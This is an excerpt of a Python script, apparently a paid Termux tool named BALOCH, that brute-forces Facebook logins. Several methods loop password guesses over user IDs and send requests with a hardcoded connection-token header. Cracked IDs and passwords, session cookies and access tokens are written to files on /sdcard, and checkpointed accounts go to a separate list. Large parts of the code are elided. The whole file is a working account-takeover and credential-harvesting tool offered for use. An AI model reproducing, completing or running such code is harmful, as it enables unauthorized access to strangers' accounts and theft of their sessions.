...
def logo():
	os.system('clear')
	logo = (f'''\033[1;97m
\33[1;34m _______    ______   __        ______    ______   __    __       
\33[1;97m|       \  /      \ |  \      /      \  /      \ |  \  |  \      
\33[1;32m| $$$$$$$\|  $$$$$$\| $$     |  $$$$$$\|  $$$$$$\| $$  | $$      
\33[1;36m| $$__/ $$| $$__| $$| $$     | $$  | $$| $$   \$$| $$__| $$      
\33[1;97m| $$    $$| $$    $$| $$     | $$  | $$| $$      | $$    $$      
\33[1;34m| $$$$$$$\| $$$$$$$$| $$     | $$  | $$| $$   __ | $$$$$$$$      
\33[1;36m| $$__/ $$| $$  | $$| $$_____| $$__/ $$| $$__/  \| $$  | $$      
\33[1;32m| $$    $$| $$  | $$| $$     \\$$    $$ \$$    $$| $$  | $$      
\33[1;34m \$$$$$$$  \$$   \$$ \$$$$$$$$ \$$$$$$   \$$$$$$  \$$   \$$                                                                                                                                                                                                   
\33[1;36m---------------------------------------------------
 \33[1;32m Owner     >>    F3TH3R
 \33[1;32m Github    >>    B3L3CH
 \33[1;32m Tool      >>    PAID
 \33[1;32mmversion   >>    0.1
\33[1;32m--------------------------------------------------''')
	p(logo)
def clear():
	os.system("clear")
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'}
				...
				if "session_key" in q:
					...
					p('\r\033[1;91m[BOY-CP] %s | %s \033[1;97m '%(uid,pw))
					cp.append(uid)
					open('/sdcard/BOY_M1_CP.txt','a').write(uid+'|'+pw+'\n')
					break
				else:
					continue
			loop+=1
	...
	def method2(self,uid,nm,pwx):
		try:
			global ok , cp , loop
			sys.stdout.write('\r [M3ST3R] %s | M2 OK/CP %s/%s '%(loop,len(ok),len(cp)));sys.stdout.flush()
			fn = nm.split(' ')[0]
			try:
				ln = nm.split(' ')[1]
			except:
...
'x-fb-connection-token': connection_token()}
				...
				if "session_key" in q:
					...
					token = q["access_token"]
					open('/sdcard/COOKIE_TOKEN.txt','a').write(cok+'|'+token+'\n')
					p('\r\033[1;92m[BOY-OK] %s | %s \033[1;97m '%(uid,pw))
					p(f" [•]\033[1;96m Cookie : {cok}\033[1;97m")
					ok.append(uid)
					open('/sdcard/BOY_M2_OK.txt','a').write(uid+'|'+pw+'\n')
					open('/sdcard/BOY_M2_COOKIES.txt','a').write(uid+'|'+pw+'|'+cok+'\n')
					break
				elif 'www.facebook.com' in q['error']['message']:
					p('\r\033[1;91m[BOY-CP] %s | %s \033[1;97m '%(uid,pw))
					cp.append(uid)
					open('/sdcard/BOY_M2_CP.txt','a').write(uid+'|'+pw+'\n')
					break
				else:
					continue
			loop+=1
	...
	def method3(self,uid,nm,pwx):
		try:
			global ok , cp , loop
			sys.stdout.write('\r [M3ST3R %s |  OK/CP %s/%s '%(loop,len(ok),len(cp)));sys.stdout.flush()
			fn = nm.split(' ')[0]
			try:
				ln = nm.split(' ')[1]
			except:
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'}
				...
				if "session_key" in q:
					...
					p('\r\033[1;92m[BOY-OK] %s | %s \033[1;97m '%(uid,pw))
					ok.append(uid)
					open('/sdcard/BOY_M3_OK.txt','a').write(uid+'|'+pw+'\n')
					open('/sdcard/BOY_M3_COOKIES.txt','a').write(uid+'|'+pw+'|'+cok+'\n')
					break
				elif 'www.facebook.com' in q['error']['message']:
					p('\r\033[1;91m[BOY-CP] %s | %s \033[1;97m '%(uid,pw))
					cp.append(uid)
					open('/sdcard/BOY_M3_CP.txt','a').write(uid+'|'+pw+'\n')
					break
				else:
					continue
			loop+=1
		...
		try:
			...
			for ps in pwx:
				...
				if "session_key" in q:
					...
					p('\r\033[1;92m[BOY-OK] %s | %s \033[1;97m '%(uid,pw))
					ok.append(uid)
					open('/sdcard/BOY_M4_OK.txt','a').write(uid+'|'+pw+'\n')
					open('/sdcard/BOY_M4_COOKIES.txt','a').write(uid+'|'+pw+'|'+cok+'\n')
					break
				elif 'www.facebook.com' in q['error']['message']:
					p('\r\033[1;91m[BOY-CP] %s | %s \033[1;97m '%(uid,pw))
					cp.append(uid)
					open('/sdcard/BOY_M4_CP.txt','a').write(uid+'|'+pw+'\n')
					break
				else:
					continue
			loop+=1
	...
	def r_crack(self,uid,pwx):
		try:
			global ok , cp , loop
			sys.stdout.write('\r [BOY] %s | Random\ OK/CP %s/%s '%(loop,len(ok),len(cp)));sys.stdout.flush()
			for pw in pwx:
				data = {"adid": str(uuid.uuid4()),
"format": "json",
"device_id": str(uuid.uuid4()),
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'}
				...
				if "session_key" in q:
					...
					p('\r\033[1;92m[BOY-OK] %s | %s \033[1;97m '%(uid,pw))
					ok.append(uid)
					open('/sdcard/BOY_NUM_OK.txt','a').write(uid+'|'+pw+'\n')
					open('/sdcard/BOY_NUM_COOKIES.txt','a').write(uid+'|'+pw+'|'+cookie+'\n')
					break
				elif 'www.facebook.com' in q['error']['message']:
					p('\r\033[1;91m[BOY-CP] %s | %s \033[1;97m '%(uid,pw))
					cp.append(uid)
					open('/sdcard/BOY_NUM_CP.txt','a').write(uid+'|'+pw+'\n')
					break
				else:
					continue
			loop+=1
